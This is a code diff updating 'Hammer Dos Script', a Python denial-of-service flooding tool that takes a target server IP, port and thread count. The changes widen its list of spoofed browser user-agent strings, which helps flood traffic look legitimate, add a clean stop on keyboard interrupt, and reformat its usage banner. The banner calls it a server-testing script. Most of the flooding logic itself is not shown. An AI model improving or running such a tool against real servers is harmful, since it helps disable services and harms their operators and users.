@@ -11,16 +11,20 @@ from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
 
 def user_agent():
-	global uagent
-	uagent=[]
-	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-	return(uagent)
+    global uagent
+    uagent = []
+    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+    uagent.append("Mozilla/5.0 (Windows; Windows NT 10.3; x64) AppleWebKit/602.43 (KHTML, like Gecko) Chrome/54.0.1632.330 Safari/534.2 Edge/11.45705")
+    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.1;; en-US Trident/5.0)")
+    uagent.append("Mozilla/5.0 (Linux; Android 6.0; HTC One809d Build/MRA58K) AppleWebKit/603.40 (KHTML, like Gecko)  Chrome/52.0.3298.288 Mobile Safari/536.4")
+    return uagent
+
 
 
 def my_bots():
@@ -39,6 +43,7 @@ def bot_hammering(url):
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
+
 
 
 def down_it(item):
@@ -61,10 +66,14 @@ def down_it(item):
 
 
 def dos():
-	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+    try:
+        while True:
+            item = q.get()
+            down_it(item)
+            q.task_done()
+    except KeyboardInterrupt:
+        print("\nStopping threads...")
+
 
 
 def dos2():
@@ -75,13 +84,13 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 https://cyweb.github.io/hammer/
-	It is the end user's responsibility to obey all applicable laws.
+	print (''' \033[92m	Hammer Dos Script v.1 https://cyweb.github.io/hammer/\n
+	It is the end user's responsibility to obey all applicable laws.\n
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
+	usage : python3 hammer.py [-s] [-p] [-t]\n
+	-h : help\n
+	-s : server ip\n
+	-p : port default 80\n
 	-t : turbo default 135 \033[0m''')
 	sys.exit()
 
